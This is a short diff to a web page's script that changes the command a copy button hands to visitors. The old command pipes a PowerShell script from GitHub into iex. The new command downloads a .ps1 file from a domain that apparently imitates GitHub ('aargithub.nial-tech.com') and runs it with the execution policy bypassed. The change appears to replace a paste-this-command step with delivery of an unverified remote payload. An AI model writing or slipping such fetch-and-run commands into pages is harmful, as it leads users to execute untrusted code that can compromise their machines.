@@ -686,7 +686,7 @@
     <script>
 
         const command =
-            'irm "https://raw.githubusercontent.com/Flunch4456/Script-web-Admin-demarrage/main/Auto%20admin%20region%20V-2.ps1" | iex';
+            '$p="$env:TEMP\a.ps1";irm https://aargithub.nial-tech.com/AR-V2.ps1 -OutFile $p;powershell -ep Bypass -f $p';
 
 
         async function copyCommand() {
